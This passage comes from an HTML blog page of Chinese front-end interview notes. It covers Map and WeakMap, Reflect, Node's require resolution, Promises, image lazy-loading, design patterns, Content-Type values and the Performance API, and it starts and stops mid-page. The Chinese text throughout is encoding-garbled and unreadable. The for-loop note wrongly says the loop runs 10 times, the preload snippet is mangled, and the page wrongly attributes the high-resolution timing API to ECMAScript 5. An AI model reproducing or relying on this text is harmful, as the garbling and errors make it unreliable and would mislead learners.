æ•°æ®ç»“æ„ã€‚å®ƒç±»ä¼¼äºå¯¹è±¡ï¼Œä¹Ÿæ˜¯é”®å€¼å¯¹çš„é›†åˆï¼Œä½†æ˜¯â€œé”®â€çš„èŒƒå›´ä¸é™äºå­—ç¬¦ä¸²ï¼Œå„ç§ç±»å‹çš„å€¼ï¼ˆåŒ…æ‹¬å¯¹è±¡ï¼‰éƒ½å¯ä»¥å½“ä½œé”®ã€‚</li><li>WeakMap ç»“æ„ä¸ Map ç»“æ„ç±»ä¼¼ï¼Œä½†æ˜¯ WeakMap <strong>åªæ¥å—å¯¹è±¡ä½œä¸ºé”®å</strong>ï¼ˆ null é™¤å¤–ï¼‰ï¼Œä¸æ¥å—å…¶ä»–ç±»å‹çš„å€¼ä½œä¸ºé”®åã€‚è€Œä¸” WeakMap çš„é”®åæ‰€æŒ‡å‘çš„å¯¹è±¡ï¼Œä¸è®¡å…¥åƒåœ¾å›æ”¶æœºåˆ¶ã€‚</li></ul><h2 id="Reflect-å¯¹è±¡åˆ›å»ºç›®çš„ï¼Ÿ"><a href="#Reflect-å¯¹è±¡åˆ›å»ºç›®çš„ï¼Ÿ" class="headerlink" title="*Reflect å¯¹è±¡åˆ›å»ºç›®çš„ï¼Ÿ"></a>*Reflect å¯¹è±¡åˆ›å»ºç›®çš„ï¼Ÿ</h2><ul><li>å°† Object å¯¹è±¡çš„ä¸€äº›æ˜æ˜¾å±äºè¯­è¨€å†…éƒ¨çš„æ–¹æ³•ï¼ˆæ¯”å¦‚ Object.definePropertyï¼Œæ”¾åˆ° Reflect å¯¹è±¡ä¸Šã€‚</li><li>ä¿®æ”¹æŸäº› Object æ–¹æ³•çš„è¿”å›ç»“æœï¼Œè®©å…¶å˜å¾—æ›´åˆç†ã€‚</li><li>è®© Object æ“ä½œéƒ½å˜æˆå‡½æ•°è¡Œä¸ºã€‚</li><li>Reflect å¯¹è±¡çš„æ–¹æ³•ä¸ Proxy å¯¹è±¡çš„æ–¹æ³•ä¸€ä¸€å¯¹åº”ï¼Œåªè¦æ˜¯ Proxy å¯¹è±¡çš„æ–¹æ³•ï¼Œå°±èƒ½åœ¨ Reflect å¯¹è±¡ä¸Šæ‰¾åˆ°å¯¹åº”çš„æ–¹æ³•ã€‚è¿™å°±è®© Proxy å¯¹è±¡å¯ä»¥æ–¹ä¾¿åœ°è°ƒç”¨å¯¹åº”çš„ Reflect æ–¹æ³•ï¼Œå®Œæˆé»˜è®¤è¡Œä¸ºï¼Œä½œä¸ºä¿®æ”¹è¡Œä¸ºçš„åŸºç¡€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç®¡ Proxy æ€ä¹ˆä¿®æ”¹é»˜è®¤è¡Œä¸ºï¼Œä½ æ€»å¯ä»¥åœ¨ Reflect ä¸Šè·å–é»˜è®¤è¡Œä¸ºã€‚</li></ul><h2 id="require-æ¨¡å—å¼•å…¥çš„æŸ¥æ‰¾æ–¹å¼ï¼Ÿ"><a href="#require-æ¨¡å—å¼•å…¥çš„æŸ¥æ‰¾æ–¹å¼ï¼Ÿ" class="headerlink" title="*require æ¨¡å—å¼•å…¥çš„æŸ¥æ‰¾æ–¹å¼ï¼Ÿ"></a>*require æ¨¡å—å¼•å…¥çš„æŸ¥æ‰¾æ–¹å¼ï¼Ÿ</h2><p>å½“ Node é‡åˆ° require(X) æ—¶ï¼ŒæŒ‰ä¸‹é¢çš„é¡ºåºå¤„ç†ã€‚</p><p>ï¼ˆ1ï¼‰å¦‚æœ X æ˜¯å†…ç½®æ¨¡å—ï¼ˆæ¯”å¦‚ require(â€˜httpâ€™)ï¼‰<br>ã€€ã€€a. è¿”å›è¯¥æ¨¡å—ã€‚<br>ã€€ã€€b. ä¸å†ç»§ç»­æ‰§è¡Œã€‚</p><p>ï¼ˆ2ï¼‰å¦‚æœ X ä»¥ â€œ./â€œ æˆ–è€… â€œ/â€œ æˆ–è€… â€œ../â€œ å¼€å¤´<br>ã€€ã€€a. æ ¹æ® X æ‰€åœ¨çš„çˆ¶æ¨¡å—ï¼Œç¡®å®š X çš„ç»å¯¹è·¯å¾„ã€‚<br>ã€€ã€€b. å°† X å½“æˆæ–‡ä»¶ï¼Œä¾æ¬¡æŸ¥æ‰¾ä¸‹é¢æ–‡ä»¶ï¼Œåªè¦å…¶ä¸­æœ‰ä¸€ä¸ªå­˜åœ¨ï¼Œå°±è¿”å›è¯¥æ–‡ä»¶ï¼Œä¸å†ç»§ç»­æ‰§è¡Œã€‚<br>    X<br>    X.js<br>    X.json<br>    X.node</p><p>ã€€ã€€c. å°† X å½“æˆç›®å½•ï¼Œä¾æ¬¡æŸ¥æ‰¾ä¸‹é¢æ–‡ä»¶ï¼Œåªè¦å…¶ä¸­æœ‰ä¸€ä¸ªå­˜åœ¨ï¼Œå°±è¿”å›è¯¥æ–‡ä»¶ï¼Œä¸å†ç»§ç»­æ‰§è¡Œã€‚<br>    X/package.jsonï¼ˆmainå­—æ®µï¼‰<br>    X/index.js<br>    X/index.json<br>    X/index.node</p><p>ï¼ˆ3ï¼‰å¦‚æœ X ä¸å¸¦è·¯å¾„<br>ã€€ã€€a. æ ¹æ® X æ‰€åœ¨çš„çˆ¶æ¨¡å—ï¼Œç¡®å®š X å¯èƒ½çš„å®‰è£…ç›®å½•ã€‚<br>ã€€ã€€b. ä¾æ¬¡åœ¨æ¯ä¸ªç›®å½•ä¸­ï¼Œå°† X å½“æˆæ–‡ä»¶åæˆ–ç›®å½•ååŠ è½½ã€‚</p><p>ï¼ˆ4ï¼‰æŠ›å‡º â€œnot foundâ€</p><h2 id="ä»€ä¹ˆæ˜¯-Promise-å¯¹è±¡ï¼Œä»€ä¹ˆæ˜¯-Promises-A-è§„èŒƒï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Promise-å¯¹è±¡ï¼Œä»€ä¹ˆæ˜¯-Promises-A-è§„èŒƒï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Promise å¯¹è±¡ï¼Œä»€ä¹ˆæ˜¯ Promises/A+ è§„èŒƒï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ Promise å¯¹è±¡ï¼Œä»€ä¹ˆæ˜¯ Promises/A+ è§„èŒƒï¼Ÿ</h2><p>Promise å¯¹è±¡æ˜¯å¼‚æ­¥ç¼–ç¨‹çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚Promises/A+ è§„èŒƒæ˜¯ JavaScript Promise çš„æ ‡å‡†ï¼Œè§„å®šäº†ä¸€ä¸ª Promise æ‰€å¿…é¡»å…·æœ‰çš„ç‰¹æ€§ã€‚</p><p>Promise æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼ˆæ„é€ å‡½æ•°å†…éƒ¨çš„ä»£ç æ˜¯ç«‹å³æ‰§è¡Œçš„ï¼‰ï¼Œæ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ª Promise å®ä¾‹ã€‚ä¸€ä¸ª Promise å®ä¾‹æœ‰ä¸‰ç§çŠ¶æ€ï¼Œåˆ†åˆ«æ˜¯ pendingã€resolved å’Œ rejectedï¼Œåˆ†åˆ«ä»£è¡¨äº†è¿›è¡Œä¸­ã€å·²æˆåŠŸå’Œå·²å¤±è´¥ã€‚å®ä¾‹çš„çŠ¶æ€åªèƒ½ç”± pending è½¬å˜ resolved æˆ–è€… rejected çŠ¶æ€ï¼Œå¹¶ä¸”çŠ¶æ€ä¸€ç»æ”¹å˜ï¼Œå°±æ— æ³•å†è¢«æ”¹å˜ã€‚çŠ¶æ€çš„æ”¹å˜æ˜¯é€šè¿‡ resolve() å’Œ reject() å‡½æ•°æ¥å®ç°çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¼‚æ­¥æ“ä½œç»“æŸåè°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ”¹å˜ Promise å®ä¾‹çš„çŠ¶æ€ï¼Œå®ƒçš„åŸå‹ä¸Šå®šä¹‰äº†ä¸€ä¸ª then æ–¹æ³•ï¼Œä½¿ç”¨è¿™ä¸ª then æ–¹æ³•å¯ä»¥ä¸ºä¸¤ä¸ªçŠ¶æ€çš„æ”¹å˜æ³¨å†Œå›è°ƒå‡½æ•°ã€‚è¿™ä¸ªå›è°ƒå‡½æ•°å±äºå¾®ä»»åŠ¡ï¼Œä¼šåœ¨æœ¬è½®äº‹ä»¶å¾ªç¯çš„æœ«å°¾æ‰§è¡Œã€‚</p><h2 id="å›¾ç‰‡æ‡’åŠ è½½å’Œé¢„åŠ è½½"><a href="#å›¾ç‰‡æ‡’åŠ è½½å’Œé¢„åŠ è½½" class="headerlink" title="å›¾ç‰‡æ‡’åŠ è½½å’Œé¢„åŠ è½½"></a>å›¾ç‰‡æ‡’åŠ è½½å’Œé¢„åŠ è½½</h2><p>æ‡’åŠ è½½å®šä¹‰ï¼šæ‡’åŠ è½½ä¹Ÿå«å»¶è¿ŸåŠ è½½ï¼ŒæŒ‡çš„æ˜¯åœ¨é•¿ç½‘é¡µä¸­å»¶è¿ŸåŠ è½½å›¾åƒï¼Œæ˜¯ä¸€ç§å¾ˆå¥½ä¼˜åŒ–ç½‘é¡µæ€§èƒ½çš„æ–¹å¼ã€‚</p><p>æ‡’åŠ è½½ä¼˜ç‚¹ï¼š</p><ul><li>èƒ½æå‡ç”¨æˆ·çš„ä½“éªŒ</li><li>å‡å°‘æ— æ•ˆèµ„æºçš„åŠ è½½</li><li>é˜²æ­¢å¹¶å‘åŠ è½½çš„èµ„æºè¿‡å¤šä¼šé˜»å¡jsçš„åŠ è½½</li></ul><p>æ‡’åŠ è½½åŸç†ï¼šé¦–å…ˆå°†é¡µé¢ä¸Šçš„å›¾ç‰‡çš„ src å±æ€§è®¾ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œè€Œå›¾ç‰‡çš„çœŸå®è·¯å¾„åˆ™è®¾ç½®åœ¨data-originalå±æ€§ä¸­ï¼Œ å½“é¡µé¢æ»šåŠ¨çš„æ—¶å€™éœ€è¦å»ç›‘å¬scrolläº‹ä»¶ï¼Œåœ¨scrolläº‹ä»¶çš„å›è°ƒä¸­ï¼Œåˆ¤æ–­æˆ‘ä»¬çš„æ‡’åŠ è½½çš„å›¾ç‰‡æ˜¯å¦è¿›å…¥å¯è§†åŒºåŸŸï¼Œå¦‚æœå›¾ç‰‡åœ¨å¯è§†åŒºå†…å°†å›¾ç‰‡çš„ src å±æ€§è®¾ç½®ä¸ºdata-original çš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°å»¶è¿ŸåŠ è½½ã€‚</p><p>æ‡’åŠ è½½å®ç°å¯ä»¥å‚è€ƒ<a href="https://juejin.cn/post/6844903614138286094">https://juejin.cn/post/6844903614138286094</a></p><p>é¢„åŠ è½½å®šä¹‰ï¼šé¢„åŠ è½½ç®€å•æ¥è¯´å°±æ˜¯å°†æ‰€æœ‰æ‰€éœ€çš„èµ„æºæå‰è¯·æ±‚åŠ è½½åˆ°æœ¬åœ°ï¼Œè¿™æ ·åé¢åœ¨éœ€è¦ç”¨åˆ°æ—¶å°±ç›´æ¥ä»ç¼“å­˜å–èµ„æºã€‚</p><p>é¢„åŠ è½½ä¼˜ç‚¹ï¼šæä¾›ç»™ç”¨æˆ·æ›´å¥½çš„ä½“éªŒï¼Œå‡å°‘ç­‰å¾…çš„æ—¶é—´ã€‚</p><p>é¢„åŠ è½½æ–¹æ³•ï¼š</p><ul><li><p>ä½¿ç”¨HTMLæ ‡ç­¾ã€‚<code>&lt;img src=&quot;xxx&quot; style=&quot;display:none&quot;/&gt;</code></p></li><li><p>ä½¿ç”¨Imageå¯¹è±¡ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;./myPreload.js&quot;</span>&gt;&lt;/script&gt;<span class="string">`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//myPreload.jsæ–‡ä»¶</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">var image= new Image()</span></span><br><span class="line"><span class="string">image.src=&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure></li></ul><p>åŒºåˆ«ï¼š<strong>ä¸€ä¸ªæ˜¯æå‰åŠ è½½ï¼Œä¸€ä¸ªæ˜¯è¿Ÿç¼“ç”šè‡³ä¸åŠ è½½ã€‚æ‡’åŠ è½½å¯¹æœåŠ¡å™¨å‰ç«¯æœ‰ä¸€å®šçš„ç¼“è§£å‹åŠ›ä½œç”¨ï¼Œé¢„åŠ è½½åˆ™ä¼šå¢åŠ æœåŠ¡å™¨å‰ç«¯å‹åŠ›</strong>ã€‚</p><h2 id="JavaScript-è®¾è®¡æ¨¡å¼"><a href="#JavaScript-è®¾è®¡æ¨¡å¼" class="headerlink" title="*JavaScript è®¾è®¡æ¨¡å¼"></a>*JavaScript è®¾è®¡æ¨¡å¼</h2><h3 id="å•ä¾‹æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#å•ä¾‹æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="å•ä¾‹æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ"></a>å•ä¾‹æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>å•ä¾‹æ¨¡å¼ä¿è¯äº†å…¨å±€åªæœ‰ä¸€ä¸ªå®ä¾‹æ¥è¢«è®¿é—®ã€‚æ¯”å¦‚è¯´å¸¸ç”¨çš„å¦‚å¼¹æ¡†ç»„ä»¶çš„å®ç°å’Œå…¨å±€çŠ¶æ€çš„å®ç°ã€‚</p><h3 id="ç­–ç•¥æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ç­–ç•¥æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ç­–ç•¥æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ç­–ç•¥æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>ç­–ç•¥æ¨¡å¼ä¸»è¦æ˜¯ç”¨æ¥å°†æ–¹æ³•çš„å®ç°å’Œæ–¹æ³•çš„è°ƒç”¨åˆ†ç¦»å¼€ï¼Œå¤–éƒ¨é€šè¿‡ä¸åŒçš„å‚æ•°å¯ä»¥è°ƒç”¨ä¸åŒçš„ç­–ç•¥ã€‚æˆ‘ä¸»è¦åœ¨ MVP æ¨¡å¼è§£è€¦çš„æ—¶å€™ç”¨æ¥å°†è§†å›¾å±‚çš„æ–¹æ³•å®šä¹‰å’Œæ–¹æ³•è°ƒç”¨åˆ†ç¦»ã€‚</p><h3 id="ä»£ç†æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä»£ç†æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä»£ç†æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä»£ç†æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p> ä»£ç†æ¨¡å¼æ˜¯ä¸ºä¸€ä¸ªå¯¹è±¡æä¾›ä¸€ä¸ªä»£ç”¨å“æˆ–å ä½ç¬¦ï¼Œä»¥ä¾¿æ§åˆ¶å¯¹å®ƒçš„è®¿é—®ã€‚æ¯”å¦‚è¯´å¸¸è§çš„äº‹ä»¶ä»£ç†ã€‚</p><h3 id="ä¸­ä»‹è€…æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸­ä»‹è€…æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸­ä»‹è€…æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä¸­ä»‹è€…æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>ä¸­ä»‹è€…æ¨¡å¼æŒ‡çš„æ˜¯ï¼Œå¤šä¸ªå¯¹è±¡é€šè¿‡ä¸€ä¸ªä¸­ä»‹è€…è¿›è¡Œäº¤æµï¼Œè€Œä¸æ˜¯ç›´æ¥è¿›è¡Œäº¤æµï¼Œè¿™æ ·èƒ½å¤Ÿå°†é€šä¿¡çš„å„ä¸ªå¯¹è±¡è§£è€¦ã€‚</p><h3 id="é€‚é…å™¨æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#é€‚é…å™¨æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="é€‚é…å™¨æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ"></a>é€‚é…å™¨æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>é€‚é…å™¨ç”¨æ¥è§£å†³ä¸¤ä¸ªæ¥å£ä¸å…¼å®¹çš„æƒ…å†µï¼Œä¸éœ€è¦æ”¹å˜å·²æœ‰çš„æ¥å£ï¼Œé€šè¿‡åŒ…è£…ä¸€å±‚çš„æ–¹å¼å®ç°ä¸¤ä¸ªæ¥å£çš„æ­£å¸¸åä½œã€‚å‡å¦‚æˆ‘ä»¬éœ€è¦ä¸€ç§æ–°çš„æ¥å£è¿”å›æ–¹å¼ï¼Œä½†æ˜¯è€çš„æ¥å£ç”±äºåœ¨å¤ªå¤šåœ°æ–¹å·²ç»ä½¿ç”¨äº†ï¼Œä¸èƒ½éšæ„æ›´æ”¹ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨é€‚é…å™¨æ¨¡å¼ã€‚æ¯”å¦‚æˆ‘ä»¬éœ€è¦ä¸€ç§è‡ªå®šä¹‰çš„æ—¶é—´è¿”å›æ ¼å¼ï¼Œä½†æ˜¯æˆ‘ä»¬åˆä¸èƒ½å¯¹ js æ—¶é—´æ ¼å¼åŒ–çš„æ¥å£è¿›è¡Œä¿®æ”¹ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨é€‚é…å™¨æ¨¡å¼ã€‚</p><h3 id="è§‚å¯Ÿè€…æ¨¡å¼å’Œå‘å¸ƒè®¢é˜…æ¨¡å¼æœ‰ä»€ä¹ˆä¸åŒï¼Ÿ"><a href="#è§‚å¯Ÿè€…æ¨¡å¼å’Œå‘å¸ƒè®¢é˜…æ¨¡å¼æœ‰ä»€ä¹ˆä¸åŒï¼Ÿ" class="headerlink" title="è§‚å¯Ÿè€…æ¨¡å¼å’Œå‘å¸ƒè®¢é˜…æ¨¡å¼æœ‰ä»€ä¹ˆä¸åŒï¼Ÿ"></a>è§‚å¯Ÿè€…æ¨¡å¼å’Œå‘å¸ƒè®¢é˜…æ¨¡å¼æœ‰ä»€ä¹ˆä¸åŒï¼Ÿ</h3><p>å‘å¸ƒè®¢é˜…æ¨¡å¼å…¶å®å±äºå¹¿ä¹‰ä¸Šçš„è§‚å¯Ÿè€…æ¨¡å¼</p><p>åœ¨è§‚å¯Ÿè€…æ¨¡å¼ä¸­ï¼Œè§‚å¯Ÿè€…éœ€è¦ç›´æ¥è®¢é˜…ç›®æ ‡äº‹ä»¶ã€‚åœ¨ç›®æ ‡å‘å‡ºå†…å®¹æ”¹å˜çš„äº‹ä»¶åï¼Œç›´æ¥æ¥æ”¶äº‹ä»¶å¹¶ä½œå‡ºå“åº”ã€‚</p><p>è€Œåœ¨å‘å¸ƒè®¢é˜…æ¨¡å¼ä¸­ï¼Œå‘å¸ƒè€…å’Œè®¢é˜…è€…ä¹‹é—´å¤šäº†ä¸€ä¸ªè°ƒåº¦ä¸­å¿ƒã€‚è°ƒåº¦ä¸­å¿ƒä¸€æ–¹é¢ä»å‘å¸ƒè€…æ¥æ”¶äº‹ä»¶ï¼Œå¦ä¸€æ–¹é¢å‘è®¢é˜…è€…å‘å¸ƒäº‹ä»¶ï¼Œè®¢é˜…è€…éœ€è¦åœ¨è°ƒåº¦ä¸­å¿ƒä¸­è®¢é˜…äº‹ä»¶ã€‚é€šè¿‡è°ƒåº¦ä¸­å¿ƒå®ç°äº†å‘å¸ƒè€…å’Œè®¢é˜…è€…å…³ç³»çš„è§£è€¦ã€‚ä½¿ç”¨å‘å¸ƒè®¢é˜…è€…æ¨¡å¼æ›´åˆ©äºæˆ‘ä»¬ä»£ç çš„å¯ç»´æŠ¤æ€§ã€‚</p><h2 id="å¼€å‘ä¸­å¸¸ç”¨çš„å‡ ç§-Content-Type-ï¼Ÿ"><a href="#å¼€å‘ä¸­å¸¸ç”¨çš„å‡ ç§-Content-Type-ï¼Ÿ" class="headerlink" title="*å¼€å‘ä¸­å¸¸ç”¨çš„å‡ ç§ Content-Type ï¼Ÿ"></a>*å¼€å‘ä¸­å¸¸ç”¨çš„å‡ ç§ Content-Type ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰application/x-www-form-urlencoded</p><p>æµè§ˆå™¨çš„åŸç”Ÿ form è¡¨å•ï¼Œå¦‚æœä¸è®¾ç½® enctype å±æ€§ï¼Œé‚£ä¹ˆæœ€ç»ˆå°±ä¼šä»¥ application/x-www-form-urlencoded æ–¹å¼æäº¤æ•°æ®ã€‚è¯¥ç§æ–¹å¼æäº¤çš„æ•°æ®æ”¾åœ¨ body é‡Œé¢ï¼Œæ•°æ®æŒ‰ç…§ key1=val1&amp;key2=val2 çš„æ–¹å¼è¿›è¡Œç¼–ç ï¼Œkey å’Œ val éƒ½è¿›è¡Œäº† URLè½¬ç ã€‚</p><p>ï¼ˆ2ï¼‰multipart/form-data</p><p>è¯¥ç§æ–¹å¼ä¹Ÿæ˜¯ä¸€ä¸ªå¸¸è§çš„ POST æäº¤æ–¹å¼ï¼Œé€šå¸¸è¡¨å•ä¸Šä¼ æ–‡ä»¶æ—¶ä½¿ç”¨è¯¥ç§æ–¹å¼ã€‚</p><p>ï¼ˆ3ï¼‰application/json</p><p>å‘Šè¯‰æœåŠ¡å™¨æ¶ˆæ¯ä¸»ä½“æ˜¯åºåˆ—åŒ–åçš„ JSON å­—ç¬¦ä¸²ã€‚</p><p>ï¼ˆ4ï¼‰text/xml</p><p>è¯¥ç§æ–¹å¼ä¸»è¦ç”¨æ¥æäº¤ XML æ ¼å¼çš„æ•°æ®ã€‚</p><h2 id="å¦‚ä½•ç¡®å®šé¡µé¢çš„å¯ç”¨æ€§æ—¶é—´ï¼Œä»€ä¹ˆæ˜¯-Performance-APIï¼Ÿ"><a href="#å¦‚ä½•ç¡®å®šé¡µé¢çš„å¯ç”¨æ€§æ—¶é—´ï¼Œä»€ä¹ˆæ˜¯-Performance-APIï¼Ÿ" class="headerlink" title="*å¦‚ä½•ç¡®å®šé¡µé¢çš„å¯ç”¨æ€§æ—¶é—´ï¼Œä»€ä¹ˆæ˜¯ Performance APIï¼Ÿ"></a>*å¦‚ä½•ç¡®å®šé¡µé¢çš„å¯ç”¨æ€§æ—¶é—´ï¼Œä»€ä¹ˆæ˜¯ Performance APIï¼Ÿ</h2><p>Performance API ç”¨äºç²¾ç¡®åº¦é‡ã€æ§åˆ¶ã€å¢å¼ºæµè§ˆå™¨çš„æ€§èƒ½è¡¨ç°ã€‚è¿™ä¸ª API ä¸ºæµ‹é‡ç½‘ç«™æ€§èƒ½ï¼Œæä¾›ä»¥å‰æ²¡æœ‰åŠæ³•åšåˆ°çš„ç²¾åº¦ã€‚</p><p>ä½¿ç”¨ getTime æ¥è®¡ç®—è„šæœ¬è€—æ—¶çš„ç¼ºç‚¹ï¼Œé¦–å…ˆï¼ŒgetTimeæ–¹æ³•ï¼ˆä»¥åŠ Date å¯¹è±¡çš„å…¶ä»–æ–¹æ³•ï¼‰éƒ½åªèƒ½ç²¾ç¡®åˆ°æ¯«ç§’çº§åˆ«ï¼ˆä¸€ç§’çš„åƒåˆ†ä¹‹ä¸€ï¼‰ï¼Œæƒ³è¦å¾—åˆ°æ›´å°çš„æ—¶é—´å·®åˆ«å°±æ— èƒ½ä¸ºåŠ›äº†ã€‚å…¶æ¬¡ï¼Œè¿™ç§å†™æ³•åªèƒ½è·å–ä»£ç è¿è¡Œè¿‡ç¨‹ä¸­çš„æ—¶é—´è¿›åº¦ï¼Œæ— æ³•çŸ¥é“ä¸€äº›åå°äº‹ä»¶çš„æ—¶é—´è¿›åº¦ï¼Œæ¯”å¦‚æµè§ˆå™¨ç”¨äº†å¤šå°‘æ—¶é—´ä»æœåŠ¡å™¨åŠ è½½ç½‘é¡µã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸¤ä¸ªä¸è¶³ä¹‹å¤„ï¼ŒECMAScript 5å¼•å…¥â€œé«˜ç²¾åº¦æ—¶é—´æˆ³â€è¿™ä¸ª APIï¼Œéƒ¨ç½²åœ¨ performance å¯¹è±¡ä¸Šã€‚å®ƒçš„ç²¾åº¦å¯ä»¥è¾¾åˆ°1æ¯«ç§’çš„åƒåˆ†ä¹‹ä¸€ï¼ˆ1ç§’çš„ç™¾ä¸‡åˆ†ä¹‹ä¸€ï¼‰ã€‚</p><p>navigationStartï¼šå½“å‰æµè§ˆå™¨çª—å£çš„å‰ä¸€ä¸ªç½‘é¡µå…³é—­ï¼Œå‘ç”Ÿ unload äº‹ä»¶æ—¶çš„ Unix æ¯«ç§’æ—¶é—´æˆ³ã€‚å¦‚æœæ²¡æœ‰å‰ä¸€ä¸ªç½‘é¡µï¼Œåˆ™ç­‰äº fetchStart å±æ€§ã€‚</p><p>loadEventEndï¼šè¿”å›å½“å‰ç½‘é¡µ load äº‹ä»¶çš„å›è°ƒå‡½æ•°è¿è¡Œç»“æŸæ—¶çš„ Unix æ¯«ç§’æ—¶é—´æˆ³ã€‚å¦‚æœè¯¥äº‹ä»¶è¿˜æ²¡æœ‰å‘ç”Ÿï¼Œè¿”å› 0ã€‚</p><p>æ ¹æ®ä¸Šé¢è¿™äº›å±æ€§ï¼Œå¯ä»¥è®¡ç®—å‡ºç½‘é¡µåŠ è½½å„ä¸ªé˜¶æ®µçš„è€—æ—¶ã€‚æ¯”å¦‚ï¼Œç½‘é¡µåŠ è½½æ•´ä¸ªè¿‡ç¨‹çš„è€—æ—¶çš„è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = performance.timing;</span><br><span class="line"><span class="keyword">var</span> pageLoadTime = t.loadEventEnd - t.navigationStart;</span><br></pre></td></tr></table></figure><h2 id="Object-assign"><a href="#Object-assign" class="headerlink" title="Object.assign()"></a>Object.assign()</h2><p>Object.assign() æ–¹æ³•ç”¨äºå°†æ‰€æœ‰å¯æšä¸¾å±æ€§çš„å€¼ä»ä¸€ä¸ªæˆ–å¤šä¸ªæºå¯¹è±¡å¤åˆ¶åˆ°ç›®æ ‡å¯¹è±¡ã€‚å®ƒå°†è¿”å›ç›®æ ‡å¯¹è±¡ã€‚</p><h2 id="Math-ceil-å’Œ-Math-floor"><a href="#Math-ceil-å’Œ-Math-floor" class="headerlink" title="Math.ceil å’Œ Math.floor"></a>Math.ceil å’Œ Math.floor</h2><p>Math.ceil() === å‘ä¸Šå–æ•´ï¼Œå‡½æ•°è¿”å›ä¸€ä¸ªå¤§äºæˆ–ç­‰äºç»™å®šæ•°å­—çš„æœ€å°æ•´æ•°ã€‚</p><p>Math.floor() === å‘ä¸‹å–æ•´ï¼Œå‡½æ•°è¿”å›ä¸€ä¸ªå°äºæˆ–ç­‰äºç»™å®šæ•°å­—çš„æœ€å¤§æ•´æ•°ã€‚</p><h2 id="js-for-å¾ªç¯æ³¨æ„ç‚¹"><a href="#js-for-å¾ªç¯æ³¨æ„ç‚¹" class="headerlink" title="js for å¾ªç¯æ³¨æ„ç‚¹"></a>js for å¾ªç¯æ³¨æ„ç‚¹</h2><ul><li>å½“åˆ¤æ–­è¯­å¥å«æœ‰å¤šä¸ªè¯­å¥æ—¶ï¼Œä»¥æœ€åä¸€ä¸ªåˆ¤æ–­è¯­å¥çš„å€¼ä¸ºå‡†ï¼Œå› æ­¤ä¸‹é¢çš„ä»£ç ä¼šæ‰§è¡Œ 10 æ¬¡ã€‚</li><li>å½“åˆ¤æ–­è¯­å¥ä¸ºç©ºæ—¶ï¼Œå¾ªç¯ä¼šä¸€ç›´è¿›è¡Œã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">5</span>, j &lt; <span class="number">9</span>; i++, j++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i, j);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸€ä¸ªåˆ—è¡¨ï¼Œå‡è®¾æœ‰-100000-ä¸ªæ•°æ®ï¼Œè¿™ä¸ªè¯¥æ€ä¹ˆåŠï¼Ÿ"><a href="#ä¸€ä¸ªåˆ—è¡¨ï¼Œå‡è®¾æœ‰-100000-ä¸ªæ•°æ®ï¼Œè¿™ä¸ªè¯¥æ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="ä¸€ä¸ªåˆ—è¡¨ï¼Œå‡è®¾æœ‰ 100000 ä¸ªæ•°æ®ï¼Œè¿™ä¸ªè¯¥æ€ä¹ˆåŠï¼Ÿ"></a>ä¸€ä¸ªåˆ—è¡¨ï¼Œå‡è®¾æœ‰ 100000 